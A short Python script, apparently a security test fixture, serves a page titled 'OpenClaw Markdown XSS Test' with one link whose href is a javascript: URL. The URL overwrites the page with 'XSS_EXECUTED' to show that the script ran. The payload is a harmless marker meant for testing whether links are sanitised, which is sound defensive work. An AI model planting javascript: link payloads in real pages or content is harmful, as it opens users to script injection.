from http.server import HTTPServer, BaseHTTPRequestHandler
import os

HTML = """
<!doctype html>
<html>
<body>

<h1>OpenClaw Markdown XSS Test</h1>

<a href="javascript:document.body.innerHTML='XSS_EXECUTED'">
CLICK_ME
</a>

</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())


    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()


port = int(os.environ.get("PORT",8080))

server = HTTPServer(("0.0.0.0",port),Handler)

print(port)

server.serve_forever()
